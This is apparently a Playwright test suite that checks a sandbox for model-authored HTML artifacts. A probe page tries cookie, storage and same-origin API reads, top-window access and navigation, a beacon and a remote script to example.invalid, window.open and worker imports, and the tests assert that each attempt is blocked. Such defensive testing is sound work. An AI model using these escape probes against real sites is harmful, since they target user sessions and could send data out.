import { test, expect, type Api } from "./fixtures";
import type { Page } from "@playwright/test";

// Artifacts v1b (html with JS/CSS): the sandbox escape suite. Written, NOT run by the author (no real browser on the executor host; e2e runs on build-host).
// A model-authored page is hostile code. The artifact below tries every escape the design must block and writes each outcome into its OWN DOM (#out),
// which the test reads back from the frame. Same page is checked twice: inside the app's <iframe sandbox="allow-scripts"> and opened as a TOP-LEVEL navigation
// (the CSP `sandbox` directive must make it an opaque origin even then).

const uniq = () => `E2E${Date.now().toString(36)}${Math.random().toString(36).slice(2, 6)}`.toUpperCase();

const PROBE = `<!doctype html><html><head><meta charset="utf-8"><style>body{font:14px sans-serif;background:#eef}#out{white-space:pre}</style></head><body><h1 id="hello">probe alive</h1><pre id="out">running</pre>
<script>
(async () => {
  const r = {}, violations = [];
  document.addEventListener("securitypolicyviolation", (e) => violations.push(e.violatedDirective));
  const t = async (name, fn) => { try { r[name] = await fn(); } catch (e) { r[name] = "blocked:" + (e && e.name || "err"); } };
  await t("fetch", async () => { const x = await fetch("/api/me"); return "LEAK:" + x.status; });
  await t("fetch-abs", async () => { const x = await fetch(location.origin + "/api/me", { credentials: "include" }); return "LEAK:" + x.status; });
  await t("cookie", async () => { const c = document.cookie; return c === "" ? "empty" : "LEAK:" + c; });
  await t("localStorage", async () => { localStorage.setItem("k", "v"); return "LEAK:write"; });
  await t("sessionStorage", async () => { sessionStorage.setItem("k", "v"); return "LEAK:write"; });
  await t("indexedDB", async () => { await new Promise((ok, no) => { const q = indexedDB.open("x"); q.onsuccess = ok; q.onerror = no; }); return "LEAK:open"; });
  await t("parent.document", async () => { if (parent === window) return "n/a(top-level)"; return "LEAK:" + parent.document.title; });
  await t("top.location", async () => { if (top === window) return "n/a(top-level)"; return "LEAK:" + top.location.href; });
  await t("top-navigation", async () => { if (top === window) return "n/a(top-level)"; top.location.href = "/api/me"; await new Promise((s) => setTimeout(s, 300)); return "stayed"; });
  await t("image-beacon", async () => { await new Promise((ok) => { const i = new Image(); i.onload = () => ok(); i.onerror = () => ok(); i.src = "https://example.invalid/b.png?x=1"; setTimeout(ok, 800); }); return violations.includes("img-src") ? "csp-blocked" : "LEAK:no-violation"; });
  await t("form-submit", async () => { const f = document.createElement("form"); f.action = "/api/x"; f.method = "post"; document.body.append(f); f.submit(); await new Promise((s) => setTimeout(s, 500)); return document.getElementById("hello") ? "stayed" : "LEAK:navigated"; });
  await t("window.open", async () => { const w = window.open("/api/me"); return w ? "LEAK:opened" : "null"; });
  await t("xhr", async () => { await new Promise((ok, no) => { const x = new XMLHttpRequest(); x.open("GET", "/api/me"); x.onload = () => ok(); x.onerror = () => no(new Error("xhr")); x.send(); }); return "LEAK:xhr"; });
  await t("worker/importScripts", async () => { const w = new Worker(URL.createObjectURL(new Blob(["importScripts(location.origin+'/sw.js');postMessage('LEAK')"]))); await new Promise((ok, no) => { w.onmessage = () => ok(); w.onerror = () => no(new Error("w")); setTimeout(() => no(new Error("timeout")), 800); }); return "LEAK:worker"; });
  await t("remote-script", async () => { await new Promise((ok) => { const s = document.createElement("script"); s.src = "https://example.invalid/x.js"; s.onload = ok; s.onerror = ok; document.head.append(s); setTimeout(ok, 600); }); return violations.includes("script-src-elem") || violations.includes("script-src") ? "csp-blocked" : "LEAK:no-violation"; });
  document.getElementById("out").textContent = JSON.stringify(r);
  document.body.dataset.done = "1";
})();
</script></body></html>`;

async function seed(api: Api, title: string, content: string): Promise<string> {
  const r = await api.mut("POST", "/api/artifacts", { title, type: "html", content });
  expect(r.status(), await r.text()).toBe(201);
  return (await r.json()).id as string;
}
async function viewUrl(api: Api, id: string, version = 1): Promise<string> {
  const r = await api.mut("POST", `/api/artifacts/${id}/view`, { version });
  expect(r.status(), await r.text()).toBe(200);
  return (await r.json()).url as string;
}
async function drop(api: Api, ids: string[]) { for (const id of ids) await api.mut("DELETE", `/api/artifacts/${id}`, {}); }

/** Every probe must be a block, never a LEAK. */
function assertAllBlocked(r: Record<string, string>, where: string) {
  const leaks = Object.entries(r).filter(([, v]) => v.startsWith("LEAK"));
  expect(leaks, `${where}: escapes succeeded: ${JSON.stringify(leaks)}`).toEqual([]);
  expect(["empty", "blocked:SecurityError"], `${where}: cookie was ${r.cookie}`).toContain(r.cookie); // empty OR access throws; never a value
  for (const k of ["fetch", "fetch-abs", "xhr", "worker/importScripts", "localStorage", "sessionStorage"]) expect(r[k], `${where} ${k}`).toMatch(/^blocked:/);
  expect(r["image-beacon"], where).toBe("csp-blocked");
  expect(r["remote-script"], where).toBe("csp-blocked");
  expect(r["form-submit"], where).toBe("stayed");
  expect(r["window.open"], where).toBe("null");
}

test.describe("html artifacts: sandbox escape suite", () => {
  test("inside the app's iframe: every escape is blocked, the page itself still runs, the frame has no allow-same-origin", async ({ app: { page, api } }) => {
    const id = await seed(api, `${uniq()} probe`, PROBE);
    try {
      await page.goto(`/artifacts/${id}`);
      const frameEl = page.getByTestId("artifact-frame");
      await expect(frameEl).toBeVisible();
      // attribute contract of the embed
      expect(await frameEl.getAttribute("sandbox")).toBe("allow-scripts");
      expect(await frameEl.getAttribute("referrerpolicy")).toBe("no-referrer");
      expect(await frameEl.getAttribute("src")).toMatch(/^\/af\/[0-9a-f-]{36}\/1\?t=/);
      const fl = page.frameLocator('[data-testid="artifact-frame"]');
      await expect(fl.locator("body[data-done='1']")).toBeAttached({ timeout: 15_000 });
      await expect(fl.locator("#hello")).toHaveText("probe alive"); // JS and CSS do run (the point of v1b)
      expect(await fl.locator("body").evaluate((b) => getComputedStyle(b).backgroundColor)).toBe("rgb(238, 238, 255)");
      const r = JSON.parse((await fl.locator("#out").textContent())!) as Record<string, string>;
      assertAllBlocked(r, "iframe");
      expect(r["parent.document"]).toMatch(/^blocked:/);
      expect(r["top.location"]).toMatch(/^blocked:/);
      expect(r["top-navigation"], "top navigation must be refused (frame stays, app stays)").toMatch(/^(stayed|blocked:)/); // browsers either ignore or throw SecurityError; the URL check below proves the host did not move
      await expect(page).toHaveURL(new RegExp(`/artifacts/${id}$`)); // the host app was not navigated
      // the app's own session is intact and nothing the page did created state in the app origin
      expect(await page.evaluate(() => localStorage.getItem("k"))).toBeNull();
    } finally { await drop(api, [id]); }
  });

  test("opened as a TOP-LEVEL navigation the document is still an opaque origin (no cookie, no same-origin fetch)", async ({ app: { page, api } }) => {
    const id = await seed(api, `${uniq()} probe-top`, PROBE);
    try {
      const url = await viewUrl(api, id);
      const resp = await page.goto(url);
      expect(resp!.status()).toBe(200);
      const h = resp!.headers();
      expect(h["content-security-policy"]).toContain("sandbox allow-scripts");
      expect(h["content-security-policy"]).toContain("connect-src 'none'");
      expect(h["content-security-policy"]).not.toContain("unsafe-eval");
      expect(h["x-frame-options"]).toBeUndefined();
      expect(h["cache-control"]).toBe("private, no-store");
      await expect(page.locator("body[data-done='1']")).toBeAttached({ timeout: 15_000 });
      expect(await page.evaluate(() => (window as any).origin)).toBe("null"); // opaque
      const r = JSON.parse((await page.locator("#out").textContent())!) as Record<string, string>;
      assertAllBlocked(r, "top-level");
    } finally { await drop(api, [id]); }
  });

  test("token rules in a real browser: bare URL 403, tampered 403, deleted artifact 404 for a still-valid URL", async ({ app: { page, api } }) => {
    const id = await seed(api, `${uniq()} tok`, "<h1>x</h1>");
    try {
      const url = await viewUrl(api, id);
      const bare = await page.request.get(url.split("?")[0]!);
      expect(bare.status()).toBe(403);
      expect(await bare.text()).toBe("");
      const tampered = await page.request.get(url.slice(0, -4) + "AAAA");
      expect(tampered.status()).toBe(403);
      expect((await page.request.get(url)).status()).toBe(200);
      await api.mut("DELETE", `/api/artifacts/${id}`, {});
      expect((await page.request.get(url)).status()).toBe(404);
    } finally { await drop(api, [id]); }
  });

  test("viewer: Preview | Source toggle, Reload re-mints, copy source, sandbox note; no console CSP errors from the app", async ({ app: { page, api } }) => {
    const id = await seed(api, `${uniq()} view`, "<!doctype html><h1 id=h>hello frame</h1><script>document.getElementById('h').dataset.js='1'</script>");
    const errs: string[] = [];
    page.on("pageerror", (e) => { if (!/access control checks/.test(e.message)) errs.push(e.message); }); // WebKit reports a fetch aborted by navigating away as a pageerror
    try {
      await page.goto(`/artifacts/${id}`);
      const fl = page.frameLocator('[data-testid="artifact-frame"]');
      await expect(fl.locator("#h")).toHaveAttribute("data-js", "1");
      await expect(page.getByTestId("artifact-sandbox-note")).toContainText("isolated sandbox");
      const before = await page.getByTestId("artifact-frame").getAttribute("src");
      await page.waitForTimeout(1100); // whole-second token expiry: a reload inside the same second mints an identical src (ossci1 flake)
      await page.getByTestId("artifact-reload").click();
      await expect.poll(async () => page.getByTestId("artifact-frame").getAttribute("src")).not.toBe(before); // a fresh token
      await expect(fl.locator("#h")).toHaveAttribute("data-js", "1");
      await page.getByTestId("artifact-mode-source").click();
      await expect(page.getByTestId("artifact-frame")).toHaveCount(0);
      await expect(page.getByTestId("artifact-code")).toContainText("<h1 id=h>hello frame</h1>");
      await expect(page.getByTestId("artifact-reload")).toHaveCount(0);
      await page.context().grantPermissions(["clipboard-read", "clipboard-write"]).catch(() => {});
      await page.getByTestId("artifact-copy").click();
      await page.getByTestId("artifact-mode-preview").click();
      await expect(page.getByTestId("artifact-frame")).toBeVisible();
      // gallery badge
      await page.goto("/artifacts");
      await expect(page.locator('[data-testid="artifact-row"] [data-testid="artifact-type"]', { hasText: "HTML" }).first()).toBeVisible();
      expect(errs).toEqual([]);
    } finally { await drop(api, [id]); }
  });
});
